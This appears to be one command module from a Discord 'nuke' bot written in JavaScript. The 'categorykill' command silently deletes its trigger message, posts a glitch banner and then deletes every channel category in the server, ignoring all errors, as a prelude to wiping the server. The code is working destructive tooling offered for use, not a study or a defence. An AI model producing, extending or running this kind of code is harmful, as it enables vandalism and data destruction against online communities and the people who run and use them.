// [CATEGORYKILL] Delete all categories first (disorganizes channel list before nuke)
const { glitchBanner } = require('../../src/ascii');

module.exports = {
  name: 'categorykill',
  description: 'Delete every channel category, orphaning all channels.',
  category: 'nukes',
  async execute(message) {
    if (!message.guild) return;
    await message.delete().catch(()=>{});
    await message.channel.send('```\n' + glitchBanner('CATEGORIES DISSOLVE') + '\n```').catch(()=>{});
    message.guild.channels.cache.filter(c=>c.type==='GUILD_CATEGORY').forEach(c=>c.delete().catch(()=>{}));
  },
};
